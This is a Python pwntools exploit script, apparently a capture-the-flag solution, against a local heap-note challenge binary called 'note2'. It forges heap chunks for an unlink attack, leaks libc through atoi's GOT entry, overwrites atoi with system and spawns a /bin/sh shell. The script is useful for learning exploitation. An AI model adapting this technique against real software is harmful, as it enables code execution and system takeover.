#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p = process('note2')
#gdb.attach(p,"b *0x400F31\nb *0x400d3c\nc\n")

elf =ELF('note2')
libc = elf.libc

def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)


def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))


def editnote(id, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)


def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))



ptr = 0x602120
fd = ptr - 0x18
bk = ptr - 0x10

p.sendafter('name:','a'*(0x40-1))
p.sendafter('address:','b'*(0x60-1))

poc =p64(0)*3+p64(0x41)+\
p64(0)+p64(0x20)+\
p64(fd)+p64(bk)+p64(0x20)+p64(0)+\
p64(0x30)+p64(0x90)+p64(0)*2

poc1 =  p64(0)+p64(0xa1)+p64(fd)+p64(bk)
poc2 = 'd'*16+p64(0xa0)+p64(0x90)

newnote(0x80,poc1)
newnote(0,'a\n')
newnote(0x80,'a\n')

deletenote(1)
newnote(0,poc2)
deletenote(2)
poc3 = 'e'*24+p64(elf.got['atoi'])
editnote(0,1,poc3)
shownote(0)
p.recvuntil('is ')
d = p.recv(6)
print d
atoi=u64(d.ljust(8,'\0'))
libc.address = atoi - libc.sym['atoi']
editnote(0,1,p64(libc.sym['system']))
p.sendlineafter('>>','/bin/sh')
p.interactive()
